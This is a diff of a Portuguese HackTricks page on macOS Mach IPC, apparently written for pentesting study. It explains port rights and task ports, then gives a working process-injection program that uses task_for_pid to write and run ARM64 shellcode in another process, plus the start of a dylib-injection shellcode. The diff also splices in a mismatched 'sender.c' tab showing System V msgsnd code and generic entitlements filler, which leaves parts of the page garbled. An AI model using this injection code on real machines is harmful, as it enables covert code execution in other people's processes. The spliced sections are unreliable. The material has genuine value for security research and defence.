@@ -1,27 +1,27 @@
-# macOS IPC - Comunicação Interprocessos
+## IPC do macOS - Comunicação entre Processos
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Mach messaging via Ports
+## Mensagens Mach via Portas
 
 O Mach usa **tarefas** como a **unidade menor** para compartilhar recursos, e cada tarefa pode conter **várias threads**. Essas **tarefas e threads são mapeadas 1:1 para processos e threads POSIX**.
 
-A comunicação entre tarefas ocorre via Comunicação Interprocessos (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.
+A comunicação entre tarefas ocorre via Comunicação Interprocesso (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.
 
 Os direitos de porta, que definem quais operações uma tarefa pode executar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são:
 
-* **Direito de recebimento**, que permite receber mensagens enviadas para a porta. As portas do Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de recebimento para cada porta** em todo o sistema (ao contrário dos pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
-  * Uma **tarefa com o direito de recebimento** pode receber mensagens e **criar direitos de envio**, permitindo que ela envie mensagens. Originalmente, apenas a **própria tarefa tem o direito de recebimento sobre sua porta**.
+* **Direito de recebimento**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de recebimento para cada porta** em todo o sistema (ao contrário dos pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
+* Uma **tarefa com o direito de recebimento** pode receber mensagens e **criar direitos de envio**, permitindo que ela envie mensagens. Originalmente, apenas a **própria tarefa tem o direito de recebimento sobre sua porta**.
 * **Direito de envio**, que permite enviar mensagens para a porta.
 * **Direito de envio único**, que permite enviar uma mensagem para a porta e depois desaparece.
 * **Direito de conjunto de porta**, que denota um _conjunto de porta_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Os conjuntos de portas podem ser usados para ouvir várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
@@ -50,8 +50,7 @@ Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. 
 * A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização cria um direito de ENVIO, o retém e transfere o direito de RECEBIMENTO para a tarefa A**.
 * launchd duplica o **direito de ENVIO e o envia para a tarefa B**.
 
-No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. As tarefas não do sistema ainda operam como descrito originalmente, o que poderia permitir a falsificação.
-
+No entanto, esse processo se aplica apenas a tarefas predefinidas do sistema. As tarefas não do sistema ainda operam como descrito originalmente, o que poderia permitir a falsificação.
 ### Exemplo de código
 
 Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.
@@ -68,64 +67,98 @@ Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** p
 
 int main() {
 
-    // Create a new port.
-    mach_port_t port;
-    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    if (kr != KERN_SUCCESS) {
-        printf("mach_port_allocate() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("mach_port_allocate() created port right name %d\n", port);
+// Create a new port.
+mach_port_t port;
+kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_allocate() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_allocate() created port right name %d\n", port);
 
 
-    // Give us a send right to this port, in addition to the receive right.
-    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
-    if (kr != KERN_SUCCESS) {
-        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("mach_port_insert_right() inserted a send right\n");
+// Give us a send right to this port, in addition to the receive right.
+kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_insert_right() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_insert_right() inserted a send right\n");
 
 
-    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
-    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
-    if (kr != KERN_SUCCESS) {
-        printf("bootstrap_register() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("bootstrap_register()'ed our port\n");
+// Send the send right to the bootstrap server, so that it can be looked up by other processes.
+kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_register() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_register()'ed our port\n");
 
 
-    // Wait for a message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-        mach_msg_trailer_t trailer;
-    } message;
+// Wait for a message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+mach_msg_trailer_t trailer;
+} message;
 
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_RCV_MSG,     // Options. We're receiving a message.
-        0,                // Size of the message being sent, if sending.
-        sizeof(message),  // Size of the buffer for receiving.
-        port,             // The port to receive a message on.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Got a message\n");
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_RCV_MSG,     // Options. We're receiving a message.
+0,                // Size of the message being sent, if sending.
+sizeof(message),  // Size of the buffer for receiving.
+port,             // The port to receive a message on.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Got a message\n");
 
-    message.some_text[9] = 0;
-    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
+message.some_text[9] = 0;
+printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
-{% endtab %}
+{% tab title="sender.c" %}
+O arquivo `sender.c` é um exemplo de um processo que envia mensagens IPC para outro processo. Ele usa a função `msgsnd()` para enviar uma mensagem para a fila de mensagens IPC. A mensagem é definida como uma estrutura `msgbuf`, que contém um tipo de mensagem e um corpo de mensagem. O tipo de mensagem é usado para identificar o tipo de mensagem que está sendo enviada e o corpo da mensagem contém os dados da mensagem.
 
-{% tab title="receiver.c" %}
+O processo `sender` primeiro obtém a chave da fila de mensagens IPC usando a função `ftok()`. Em seguida, ele cria a fila de mensagens IPC usando a função `msgget()`. Depois disso, ele preenche a estrutura `msgbuf` com o tipo de mensagem e o corpo da mensagem e envia a mensagem para a fila de mensagens IPC usando a função `msgsnd()`.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+
+#define MSGSZ     128
+
+typedef struct msgbuf {
+    long mtype;
+    char mtext[MSGSZ];
+} message_buf;
+
+int main() {
+    key_t key;
+    int msgid;
+    message_buf buf;
+
+    key = ftok("receiver.c", 'B');
+    msgid = msgget(key, 0666 | IPC_CREAT);
+
+    buf.mtype = 1;
+    strcpy(buf.mtext, "Hello, world!");
+
+    msgsnd(msgid, &buf, sizeof(buf.mtext), 0);
+
+    return 0;
+}
+```
+
+{% endtab %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -136,63 +169,63 @@ int main() {
 
 int main() {
 
-    // Lookup the receiver port using the bootstrap server.
-    mach_port_t port;
-    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
-    if (kr != KERN_SUCCESS) {
-        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("bootstrap_look_up() returned port right name %d\n", port);
+// Lookup the receiver port using the bootstrap server.
+mach_port_t port;
+kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_look_up() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_look_up() returned port right name %d\n", port);
 
 
-    // Construct our message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-    } message;
+// Construct our message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+} message;
 
-    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-    message.header.msgh_remote_port = port;
-    message.header.msgh_local_port = MACH_PORT_NULL;
+message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+message.header.msgh_remote_port = port;
+message.header.msgh_local_port = MACH_PORT_NULL;
 
-    strncpy(message.some_text, "Hello", sizeof(message.some_text));
-    message.some_number = 35;
+strncpy(message.some_text, "Hello", sizeof(message.some_text));
+message.some_number = 35;
 
-    // Send the message.
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_SEND_MSG,    // Options. We're sending a message.
-        sizeof(message),  // Size of the message being sent.
-        0,                // Size of the buffer for receiving.
-        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Sent a message\n");
+// Send the message.
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_SEND_MSG,    // Options. We're sending a message.
+sizeof(message),  // Size of the message being sent.
+0,                // Size of the buffer for receiving.
+MACH_PORT_NULL,   // A port to receive a message on, if receiving.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Sent a message\n");
 }
 ```
 ### Portas Privilegiadas
 
 * **Porta do host**: Se um processo tem o privilégio **Enviar** sobre esta porta, ele pode obter **informações** sobre o **sistema** (por exemplo, `host_processor_info`).
 * **Porta de privilégio do host**: Um processo com o direito de **Enviar** sobre esta porta pode realizar ações **privilegiadas** como carregar uma extensão do kernel. O **processo precisa ser root** para obter essa permissão.
-  * Além disso, para chamar a API **`kext_request`**, é necessário ter a autorização **`com.apple.private.kext`**, que é dada apenas a binários da Apple.
+* Além disso, para chamar a API **`kext_request`**, é necessário ter a permissão **`com.apple.private.kext`**, que é dada apenas a binários da Apple.
 * **Porta do nome da tarefa:** Uma versão não privilegiada da _porta da tarefa_. Ele faz referência à tarefa, mas não permite controlá-la. A única coisa que parece estar disponível através dela é `task_info()`.
 * **Porta da tarefa** (também conhecida como porta do kernel)**:** Com a permissão de Envio sobre esta porta, é possível controlar a tarefa (ler/escrever memória, criar threads...).
-  * Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa do chamador. Esta porta é apenas **herdada** através do **`exec()`**; uma nova tarefa criada com `fork()` recebe uma nova porta de tarefa (como um caso especial, uma tarefa também recebe uma nova porta de tarefa após `exec()`ing um binário suid). A única maneira de criar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) enquanto faz um `fork()`.
-  * Estas são as restrições para acessar a porta (de `macos_task_policy` do binário `AppleMobileFileIntegrity`):
-    * Se o aplicativo tiver a autorização **`com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso para lançamentos de produção.
-    * Aplicativos com a autorização **`com.apple.system-task-ports`** podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamado de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
-    * **Root pode acessar portas de tarefas** de aplicativos **não** compilados com um tempo de execução **fortificado** (e não da Apple).
+* Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa do chamador. Esta porta é apenas **herdada** através do **`exec()`**; uma nova tarefa criada com `fork()` recebe uma nova porta de tarefa (como um caso especial, uma tarefa também recebe uma nova porta de tarefa após `exec()`ing um binário suid). A única maneira de criar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) enquanto faz um `fork()`.
+* Estas são as restrições para acessar a porta (de `macos_task_policy` do binário `AppleMobileFileIntegrity`):
+* Se o aplicativo tiver a permissão **`com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionado pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
+* Aplicativos com a permissão **`com.apple.system-task-ports`** podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamado de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
+* **Root pode acessar portas de tarefa** de aplicativos **não** compilados com um tempo de execução **fortificado** (e não da Apple).
 
-### Injeção de Processo Shellcode via Porta da Tarefa
+### Injeção de Processo Shellcode via Porta de Tarefa
 
-Você pode obter um shellcode de:
+Você pode pegar um shellcode de:
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -206,31 +239,41 @@ Você pode obter um shellcode de:
 #import <Foundation/Foundation.h>
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-        [NSThread sleepForTimeInterval:99999];
-    }
-    return 0;
+@autoreleasepool {
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
+[NSThread sleepForTimeInterval:99999];
+}
+return 0;
 }
 ```
 {% endtab %}
 
 {% tab title="entitlements.plist" %}
 
-O arquivo `entitlements.plist` é um arquivo de propriedades que contém informações sobre as permissões e recursos que um aplicativo tem acesso. Ele é usado para definir as capacidades do aplicativo e é assinado digitalmente para garantir sua integridade. O arquivo é usado pelo sistema operacional para verificar se o aplicativo tem permissão para acessar determinados recursos, como a câmera, o microfone ou a localização do usuário. Se um aplicativo não tiver as permissões necessárias, ele não poderá acessar esses recursos. O arquivo `entitlements.plist` é uma parte importante do processo de sandboxing do macOS, que ajuda a proteger o sistema operacional contra ataques maliciosos.
+# Entitlements.plist
+
+O arquivo `entitlements.plist` é um arquivo de propriedades que contém informações sobre as permissões e recursos que um aplicativo tem acesso. Ele é usado para definir as permissões de acesso a recursos do sistema, como acesso à rede, acesso ao sistema de arquivos, acesso ao microfone e câmera, etc.
+
+Os aplicativos podem solicitar permissões adicionais por meio do arquivo `entitlements.plist`. Por exemplo, um aplicativo que precisa acessar a câmera do dispositivo pode incluir uma entrada no arquivo `entitlements.plist` para solicitar permissão para acessar a câmera.
+
+Os arquivos `entitlements.plist` são assinados digitalmente e verificados pelo sistema operacional antes de serem executados. Isso garante que os aplicativos não possam obter permissões adicionais sem a aprovação do usuário.
+
+Os arquivos `entitlements.plist` são usados ​​para garantir que os aplicativos tenham acesso apenas aos recursos necessários e para evitar que os aplicativos acessem recursos não autorizados. Eles são uma parte importante do sistema de segurança do macOS e devem ser usados ​​corretamente para garantir a segurança do sistema. 
+
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>com.apple.security.get-task-allow</key>
-    <true/>
+<key>com.apple.security.get-task-allow</key>
+<true/>
 </dict>
 </plist>
 ```
 {% endtab %}
 {% endtabs %}
 
-**Compile** o programa anterior e adicione as **entitlements** para poder injetar código com o mesmo usuário (caso contrário, você precisará usar **sudo**).
+**Compile** o programa anterior e adicione as **permissões** para poder injetar código com o mesmo usuário (se não, você precisará usar **sudo**).
 
 <details>
 
@@ -248,18 +291,18 @@ O arquivo `entitlements.plist` é um arquivo de propriedades que contém informa
 
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -277,118 +320,118 @@ char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\
 
 int inject(pid_t pid){
 
-    task_t remoteTask;
+task_t remoteTask;
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
-    
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
-    
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-    // Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-	return (-3);
-    }
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
 
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
-	
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    const char* p = (const char*) remoteCode64;
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+const char* p = (const char*) remoteCode64;
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-    return (0);
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
 }
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        if (argc < 2) {
-            NSLog(@"Usage: %s <pid>", argv[0]);
-            return 1;
-        }
+@autoreleasepool {
+if (argc < 2) {
+NSLog(@"Usage: %s <pid>", argv[0]);
+return 1;
+}
 
-        pid_t pid = atoi(argv[1]);
-        inject(pid);
-    }
+pid_t pid = atoi(argv[1]);
+inject(pid);
+}
 
-    return 0;
+return 0;
 }
 ```
 </details>
@@ -398,9 +441,9 @@ gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ```
 ### Injeção de Processo Dylib via Porta de Tarefa
 
-No macOS, **threads** podem ser manipulados via **Mach** ou usando a **API posix `pthread`**. O thread gerado na injeção anterior foi gerado usando a API Mach, portanto, **não é compatível com posix**.
+No macOS, as **threads** podem ser manipuladas via **Mach** ou usando a **API posix `pthread`**. A thread gerada na injeção anterior foi gerada usando a API Mach, portanto, **não é compatível com posix**.
 
-Foi possível **injetar um shellcode simples** para executar um comando porque ele **não precisava trabalhar com APIs compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que o **thread** também fosse **compatível com posix**.
+Foi possível **injetar um shellcode simples** para executar um comando porque ele **não precisava trabalhar com APIs compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.
 
 Portanto, para **melhorar o shellcode**, ele deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Em seguida, este novo pthread pode **chamar dlopen** para **carregar nossa dylib** do sistema.
 
@@ -438,18 +481,18 @@ Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um 
 // And I say, bullshit.
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -464,222 +507,222 @@ kern_return_t mach_vm_write
 
 char injectedCode[] =
 
-    "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
-    // Call pthread_set_self
+// Call pthread_set_self
 
-    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
-    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
-    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
-    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
-    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
-    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
-    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
-    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
-    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
-    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
-    "\x00\x00\x00\x14" // loop: b loop              ; loop forever
